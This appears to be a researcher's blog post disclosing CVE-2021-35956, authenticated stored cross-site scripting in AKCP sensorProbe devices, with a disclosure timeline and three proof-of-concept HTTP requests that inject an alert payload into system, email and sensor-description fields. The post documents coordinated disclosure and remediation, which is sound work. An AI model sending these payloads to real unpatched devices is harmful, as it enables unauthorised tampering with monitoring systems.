---
title: CVE-2021-35956 AKCP sensorProbe - 'Multiple' Cross Site Scripting (XSS)
description: How I got my first CVE vulnerability assigned üéâ
featured: true
feature-header: "Featured Research \U0001F447"
tag: Vulnerability Research
image: "/assets/img/posts/2021-06-28-CVE-2021-35956/preview.png"
layout: post
date: '2021-06-28 00:01:21 -0400'
last-updated: '2021-06-28 00:01:21 -0400'
style: blog1
author: Tyler Butler
lead: How I got my first CVE vulnerability assigned üéâ
card: card-2
postid: 1
redirect_from:
- "/CVE-2021-35956"
navheader: posts
---

This week, I was incredibly fortunate to finally get my first CVE vulnerability assigned by Mitre üéâ ! <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35956" class="highlighted">CVE-2021-35956</a> details multiple stored cross-site scripting (XSS) vulnerabilities I discovered in the AKCP sensorProbe embedded webserver. In this post, I'll describe the technical details of the vulnerability, the vendor's response, and remediation options. Overall AKCP was an exceptional partner in the responsible disclosure process, remediating the issue quickly and providing me with a test unit to verify the updated firmware. 

####  **Index**  
+  [Disclosure Timeline]({{page.url}}#-disclosure-timeline)
+  [About the Vendor]({{page.url}}#-about-the-vendor)
+  [Vulnerability Details]({{page.url}}#-cve-2021-35956-vulnerability-details)
+  [Firmware Upgrade]({{page.url}}#-firmware-upgrade)

#### **‚è± Disclosure Timeline**

  <div class="timeline mt-1 mb-1">
      <div class="tl-item active">
          <div class="tl-dot b-warning"></div>
          <div class="tl-content">
              <div class="">I attempt to find a security contact at AKCP, could not do so, and contacted the sales team at sales@akcp.com</div>
              <div class="tl-date text-muted mt-1">29 May 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-warning"></div>
          <div class="tl-content">
              <div class="">I recieve response from management, and release my responsible disclosure report</div>
              <div class="tl-date text-muted mt-1">29 May 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-primary"></div>
          <div class="tl-content">
              <div class="">AKCP provides me a copy of beta test firmware for the fix</div>
              <div class="tl-date text-muted mt-1">15 June 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-primary"></div>
          <div class="tl-content">
              <div class="">AKCP provides me an ip address for a test unit to verify the fix, I confirm the vulnerability has been fixed</div>
              <div class="tl-date text-muted mt-1">16 June 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-primary"></div>
          <div class="tl-content">
              <div class="">AKCP releases updated <a href="http://www.akcp.in.th/downloads/Firmwares/SP480-20210624.zip" class="highlighted">firmware</a> on their website and updates their <a href="https://www.akcp.com/support-center/customer-login/sensor-probe-firmware-changelog/" class="highlighted">changelog</a> mentioning the XSS vulnerability</div>
              <div class="tl-date text-muted mt-1">25 June 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-danger"></div>
          <div class="tl-content">
              <div class="">I submit a request for CVE through Mitre's <a href="https://cveform.mitre.org/" class="highlighted">submission form</a></div>
              <div class="tl-date text-muted mt-1">28 June 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-danger"></div>
          <div class="tl-content">
              <div class="">Mitre reserves CVE-2021-35956 for the vulnerability </div>
              <div class="tl-date text-muted mt-1">29 June 2021</div>
          </div>
      </div>
    </div>

#### **üí° About the Vendor**  

<a href="https://www.akcp.com" class="highlighted">AKCP</a> is a sensor manufacturer developing network-based temperature, enviorment, and power monitoring devices. Their clients include big names like Nasa, Coca-cola, Toyota, Adobe, and much <a href="https://www.akcp.com/about-akcp-2/" class="highlighted">more</a>. Their most popular devices include the sensorProbe, securityProbe, and AKCPro Server. This research identifies multiple stored cross-site scripting vulnerabilities in all sensorProbe devices. According to <a href="https://www.akcp.com/akcp-products/sensorprobe-series/" class="highlighted">AKCP</a>, the sensorProbe devices are,

*"the worlds **most installed** Remote Environmental Sensor Monitoring Device ... deployed in a wide variety of industries including Data Center Environmental Monitoring, Warehouse Temperature Monitoring, Cold Storage Temperature Monitoring, Fuel / Generator Monitoring, and other Remote Site Monitoring applications."*



####  **üÜò CVE-2021-35956 Vulnerability Details**  

All sensorProbe devices prior to firmware version SP480-20210624 are vulnerable to authenticated stored cross-site scripting via the Sensor Description, Email, and System setting fields. Authenticated users can introduce arbitrary javascript through the vulnerable fields, and have payloads execute in the context of users who visit the sensorProbe embedded webserver dashboard. While stored XSS can be dangerous, this vulnerability requires the attacker to already be authenticated in order to store payloads. 

*The following section identifies proof of concepts for each vulnerable field*  

#### Stored Cross-Site Scripting via System Settings  

The sensorProbe embedded web server is vulnerable to authenticated stored cross-site scripting via the system name and system location parameters in system settings.

**Payload**: ``<svg/onload=alert`xss`>``

**Proof of Concept**  

```yaml
POST /system?time=32e004c941f912 HTTP/1.1
Host: [target]
Content-Length: 114
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://[target]
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://[target]/system?time=32e004c941f912
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

_SA01=System+Namer&_SA02=RDC&_SA03=Name<svg/onload=alert`xss`>&_SA04=1&_SA06=0&_SA36=0&_SA37=0&sbt1=Save
```  

<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-06-28-CVE-2021-35956/xss_0.png">
    </div>
</div>  


<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-06-28-CVE-2021-35956/xss-1.png">
    </div>
</div>  



#### 2) Stored Cross-Site Scripting via Email Settings  

The sensorProbe embedded web server is vulnerable to authenticated stored cross-site scripting via the mail from, mail to, and mail cc  parameters in email settings.  

**Payload**: ``<svg/onload=alert`xss`>``

**Proof of Concept**

```yaml
POST /mail?time=32e004c941f912 HTTP/1.1
Host: [target]
Content-Length: 162
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://[target]
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://[target]/mail?time=32e004c941f912
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


_PS03=test@test.com&_PS04=test@test.com&_PS05_0=test@test.com&_PS05_1=test@test.comr&_PS05_3=<svg/onload=alert`xxss`>&_PS05_4=&sbt2=Save
```   

<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-06-28-CVE-2021-35956/xss_2x.png">
    </div>
</div>  

<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-06-28-CVE-2021-35956/xss_3.png">
    </div>
</div>  




#### 3) Stored Cross-Site Scripting via Sensor Description

The sensorProbe embedded web server is vulnerable to authenticated stored cross-site scripting via sensor settings description parameter for each of the sensor options. 


**Payload**: ``<svg/onload=alert`xss`>``

**Proof of Concept**  


```yaml
POST /senswatr?index=0&time=32e004c941f912 HTTP/1.1
Host: [target]
Content-Length: 55
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://[target]
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://[target]/senswatr?index=0&time=32e004c941f912
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: CPCookie=sensors=400
Connection: close

_WT00-IX="><svg/onload=alert`xss`>&_WT03-IX=2&sbt1=Save
```  

####  **üöÄ Firmware Upgrade**  

As of Friday June 25th, SensorProbe users can upgrade their devices to SP480-20210624 according to AKCP standards outlined in the <a href="https://www.akcp.com/support-center/customer-login/sensorprobe-series-firmware-download/" class="highlighted">firmware download</a> page.  

```text
Firmware Update ‚Äì Download ‚Äì release date 28 June 2021
Latest Firmware ‚Äì SP480-20210624
Note: To download files, right-click on the file and select ‚Äúsave as‚Äù
md5sum: 83f107f274ed6fda2cd5aa0f21935a98

IMPORTANT NOTE: The sensorProbe2 & SP8 units with the Atmega128 micro-controller (SPxxxi) do not support this firmware version. You can check your units micro-controller version in the web interface System page >> System Description. If you see an ‚ÄúI‚Äù after the firmware version (SPxxxi) then your unit is using the older Atmega128 micro-controller. Please see below for the latest firmware for your SP8 base unit.
```  


<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-06-28-CVE-2021-35956/changelog.png">
    </div>
</div>  



